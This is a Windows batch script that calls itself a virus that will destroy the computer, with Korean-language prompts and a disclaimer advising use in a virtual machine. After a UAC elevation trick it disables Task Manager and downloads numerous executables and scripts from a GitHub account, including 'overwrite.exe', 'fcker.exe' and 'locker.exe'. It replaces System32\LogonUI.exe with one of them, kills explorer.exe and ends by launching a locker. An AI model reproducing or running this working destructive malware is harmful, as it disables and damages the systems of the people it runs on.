@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------

:choose
set /p choose=이 바이러스는 당신의 컴퓨터를 파괴합니다. 계속 하시겠습니까? (예, 아니오) : 
if %choose%==예 goto onemore
if %choose%==아니오 goto exit
cls
goto choose

:no
echo ok!
timeout 1 /nobreak > nul
exit

:onemore
set /p choose=이 바이러스를 실행하여 일어난 모든 불상사를 책임지지 않습니다. 자신의 실제 컴퓨터로 하지 마시고 가상머신을 사용하여 테스트 해주시기 바랍니다. 계속 하시겠습니까? (예, 아니오) : 
if %choose%==예 goto yes
if %choose%==아니오 goto exit
cls
goto onemore

:yes
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
md C:\file
cd C:\file
md files
md musics

cd C:\file\musics
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/1.wav "C:\file\musics\1.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/2.wav "C:\file\musics\2.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/3.wav "C:\file\musics\3.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/4.wav "C:\file\musics\4.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/dizziness.mp3 "C:\file\musics\dizziness.mp3"

cd C:\file\files
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/OVERWRITE/raw/main/overwrite.exe "C:\file\files\overwrite.exe
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/OVERWRITE/raw/main/fcker.exe "C:\file\files\fcker.exe
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/ErrorCursor64.exe "C:\file\files\ErrorCursor64.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/Invert64.exe "C:\file\files\Invert64.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/locker.exe "C:\file\files\locker.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/ShakeCursor64.exe "C:\file\files\ShakeCursor64.exe"
curl https://raw.githubusercontent.com/BAtchfiler0/Covid/main/benben.ps1 > "C:\file\files\benben.ps1"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/blur.exe "C:\file\files\blur.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/coronaimg.exe "C:\file\files\coronaimg.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/roating.exe "C:\file\files\roating.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/copy.exe "C:\file\files\copy.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/rainbow.exe "C:\file\files\rainbow.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/blackandwhite.exe "C:\file\files\blackandwhite.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/nircmd.exe "C:\file\files\nircmd.exe"
curl https://raw.githubusercontent.com/BAtchfiler0/Covid/main/song.vbs > "C:\file\files\song.vbs"
curl https://raw.githubusercontent.com/BAtchfiler0/Covid/main/song1.vbs > "C:\file\files\song1.vbs"

md C:\files
bitsadmin.exe /transfer "Covid File Download" https://raw.githubusercontent.com/BAtchfiler0/Covid/main/covoid.png "C:\files\covid.png"

copy C:\file\files\fcker.exe C:\Windows\System32\LogonUI.exe /Y
start blur.exe
start nircmd mediaplay 13000 "c:\file\musics\dizziness.mp3"
timeout /t 13
taskkill /f /im blur.exe
start blackandwhite.exe
nircmd beep 2000 2000
timeout /t 3
start nircmd mediaplay 20000 "c:\file\musics\4.wav"
start song.vbs
start invert64.exe
start shakecursor64.exe
start ErrorCursor64.exe
timeout /t 20
taskkill /f /im copy.exe
taskkill /f /im errorcursor64.exe
taskkill /f /im invert64.exe
start coronaimg.exe
start song1.vbs
taskkill /f /im explorer.exe
start nircmd mediaplay 20000 "c:\file\musics\3.wav"
timeout /t 20
start explorer.exe
taskkill /f /im coronaimg.exe
taskkill /f /im roating.exe
taskkill /f /im shakecursor64.exe
(
echo Dim msg, sapi
echo Set sapi = createObject^("sapi.spvoice"^)
echo Set sapi.Voice = sapi.GetVoices.Item^(1^)
echo.
echo sapi.Speak "covoid-19"
) > voice.vbs


echo msgbox "you are rotting now",16+4096,"Covid-19" > covidmsg.vbs

start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1

taskkill /f /im wscript.exe

start blackandwhite.exe
nircmd beep 2000 2000
timeout /t 3
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\rainbow.exe" ^& Chr^(34^), 0
) > song2.vbs
start song2.vbs
start nircmd mediaplay 20000 "c:\file\musics\2.wav"
timeout /t 10
start song.vbs
taskkill /f /im rainbow.exe
taskkill /f /im copy.exe
start blackandwhite.exe

taskkill /f /im explorer.exe

start locker.exe
exit